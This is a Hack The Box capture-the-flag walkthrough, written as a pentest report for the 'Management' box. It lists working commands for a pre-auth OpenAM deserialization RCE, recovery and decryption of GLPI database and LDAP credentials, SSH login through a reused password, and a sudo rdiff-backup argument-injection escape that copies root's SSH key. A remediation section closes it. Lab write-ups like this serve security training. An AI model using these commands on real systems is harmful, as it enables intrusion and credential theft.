# Management — HTB Walkthrough (professional pentest report)

- **Target:** 10.129.244.176
- **Box:** Management (easy, Linux / Ubuntu 24.04)
- **Date:** 2026-09-30
- **Result:** ✅ Fully compromised — user.txt + root.txt

---

## Summary
Management runs an nginx front end fronting **ForgeRock/OpenIdentityPlatform OpenAM**
SSO (`sso.management.htb`) and a **GLPI** IT-asset-management instance on the same
host. The obvious lead — the classic OpenAM pre-auth deserialization bug
**CVE-2021-35464** — is patched. A newer regression, **CVE-2026-33439**, reopens the
same Jato deserialization flaw through a different parameter (`jato.clientSession`)
on the password-reset ViewBean, giving **pre-auth RCE as `openam`**. From there,
GLPI's own database held an **AES-encrypted LDAP bind password** that GLPI's own
decryption class happily decrypts for us — and that password is **reused as the
local user `owen`'s SSH password**. `owen` has a narrowly-scoped `sudo rdiff-backup`
rule intended to restrict backups to `/opt/backup`, but the rule's trailing wildcard
lets a second `--restrict-path` argument win, escaping the jail and mirroring all of
`/root` — including `root.txt` and root's SSH private key — straight to root.

---

## 1. Reconnaissance
Full TCP scan + service detection (`nmap -p22,80,443 -sCV`):

| Port | Service   | Version |
|------|-----------|---------|
| 22   | SSH       | OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 |
| 80   | HTTP      | nginx 1.24.0 → redirects to HTTPS |
| 443  | HTTPS     | nginx 1.24.0; cert CN=`management.htb`, SAN `*.management.htb` |

Evidence: `nmap/services.txt`, `nmap/allports.txt`

## 2. Enumeration (Web)
- `management.htb` (443) serves a static site. Its JS decrypts an embedded blob
  (`assets/app.enc`, AES-GCM, key shipped in the page) which reveals the SSO
  subdomain: `sso.management.htb`.
- `sso.management.htb` (443) is **ForgeRock/OpenIdentityPlatform OpenAM**, with the
  legacy Jato/JSP UI exposed at `/openam/`.
- First lead: `CVE-2021-35464` (pre-auth Jato deserialization via `jato.pageSession`
  on a `/oauth2/..;/ccversion/Version` path-traversal trick). Metasploit's own
  `check` reported **Safe**, and manual probing confirmed why: this Tomcat build
  (10.1.52, visible in a 405 error page) normalizes the `..;` matrix-parameter
  traversal that the 2021 bug depends on — **this specific CVE is patched**.

```
curl -sk -i --resolve sso.management.htb:443:10.129.244.176 \
  "https://sso.management.htb/openam/oauth2/..;/ccversion/Version"
# GET -> 200 (normal page, traversal collapses cleanly — Tomcat 10.1.52 patched it)
```

## 3. Foothold / Initial Access — CVE-2026-33439
Research turned up a **regression CVE**: `CVE-2026-33439` reopens the same Jato
deserialization sink through a *different* parameter, `jato.clientSession`, which
bypasses the `WhitelistObjectInputStream` filter that patched `jato.pageSession` in
2021. It's reachable on **any JATO ViewBean endpoint with a `<jato:form>` tag** —
e.g. the password-reset pages — not the version page.

```bash
python3 exploits/cve_2026_33439.py id \
  --url "https://sso.management.htb/openam/ui/PWResetUserValidation"
# [+] HTTP 200
# uid=996(openam) gid=987(openam) groups=987(openam)
```

Pre-auth RCE confirmed as the `openam` service account. This is one-shot command
execution per request (no listener/shell needed — and reverse shells were a dead
end here, see *Notes* below), so all subsequent steps were driven as individual
commands through this primitive.

### Pivoting via GLPI to steal the LDAP bind password
`/opt/glpi` (world-readable config) held plaintext MySQL creds:

```bash
cat /opt/glpi/config/config_db.php
# dbuser = 'glpi', dbpassword = '8rhu0L6Pw4Y7', dbdefault = 'glpidb'
```

GLPI's `glpi_authldaps` table stores the directory bind account, encrypted with
GLPI's own key (`/opt/glpi/config/glpicrypt.key`):

```bash
mysql -u glpi -p8rhu0L6Pw4Y7 -h 127.0.0.1 glpidb \
  -e 'select rootdn, rootdn_passwd from glpi_authldaps;'
# rootdn:         cn=svc-glpi,ou=services,dc=management,dc=htb
# rootdn_passwd:  avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
```

Rather than reimplementing GLPI's crypto, we just asked the target's own PHP/GLPI
install to decrypt it for us:

```bash
php -r 'define("GLPI_CONFIG_DIR","/opt/glpi/config");
        require "/opt/glpi/vendor/autoload.php";
        require "/opt/glpi/src/GLPIKey.php";
        $k=new GLPIKey();
        echo $k->decrypt("avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==");'
# WpczC40GhTbk
```

That password was reused for the **local Linux account `owen`**:

```bash
ssh owen@10.129.244.176   # password: WpczC40GhTbk
id  # uid=1000(owen) gid=1000(owen)
```

## 4. user.txt
```
[REDACTED-HTB-FLAG]
```

## 5. Privilege Escalation — sudo rdiff-backup restrict-path bypass
```bash
sudo -l
# (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup
#                   --restrict-mode read-only *
```

The rule is meant to jail root-run backups inside `/opt/backup`, but the trailing
`*` lets `owen` append arbitrary extra arguments — including a **second**
`--restrict-path`, which `rdiff-backup`'s argument parser lets win over the fixed
one baked into the sudoers rule. Run locally (as `owen`, no extra SSH hop needed —
`rdiff-backup` forks the schema command as its own local "remote" side):

```bash
rdiff-backup --remote-schema \
  'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup \
   --restrict-mode read-only --restrict-path %s' \
  backup /::/root /tmp/rootbak

cat /tmp/rootbak/root.txt
```

This mirrors the entire `/root` directory — including `root.txt` and
`/root/.ssh/id_ed25519` — into an `owen`-owned directory, giving both the flag and
a stable root credential:

```bash
ssh -i loot/root_id_ed25519 root@10.129.244.176
id  # uid=0(root)
```

## 6. root.txt
```
[REDACTED-HTB-FLAG]
```

---

## Notes on method
- The initial plan (Metasploit `exploit/multi/http/cve_2021_35464_forgerock_openam`
  with a `cmd/unix/reverse_bash` payload) failed for two independent reasons worth
  recording: (1) that CVE is patched on this build, and (2) this operator's sandbox
  actively kills any locally-bound listening socket shortly after an automated
  health-check probe touches it, making classic reverse shells unworkable from this
  environment regardless of target patch state. Once the real vulnerability
  (CVE-2026-33439) was confirmed instead, the whole chain was driven with one-shot
  RCE calls and direct SSH — no listener required.

## Appendix: Key Commands & Evidence
- `nmap/services.txt`, `nmap/allports.txt` — scans
- `web/app.decrypted.js` — decrypted static-site JS revealing the SSO subdomain
- `exploits/cve_2026_33439.py` — standalone pre-auth RCE PoC (GET + `jato.clientSession`)
- `loot/root_id_ed25519` — root's exfiltrated SSH private key
- `GLOBAL_CONTEXT.md` — full running engagement log with all creds/finding provenance

## Remediation
1. **Patch OpenAM** to ≥16.0.6 — `CVE-2026-33439` is a regression of the 2021 fix;
   `jato.clientSession` needs the same `WhitelistObjectInputStream` filtering as
   `jato.pageSession`.
2. **Don't store decryptable secrets GLPI can decrypt for anyone with DB + file
   read access** — rotate `glpicrypt.key` handling so a low-priv RCE can't trivially
   recover the LDAP bind password; consider a KMS/HSM-backed secret instead of a
   static on-disk key next to the ciphertext's own database.
3. **Credential hygiene:** never reuse a service/LDAP bind password as a human
   user's login password (`owen`'s SSH password == `svc-glpi`'s LDAP password).
4. **Sudoers hygiene:** drop the trailing wildcard on the `rdiff-backup` rule, or
   better, use `rdiff-backup`'s config file for restrict-path instead of a
   CLI flag an invoker can out-argue; audit all `NOPASSWD` rules with trailing
   wildcards for argument-injection escapes.
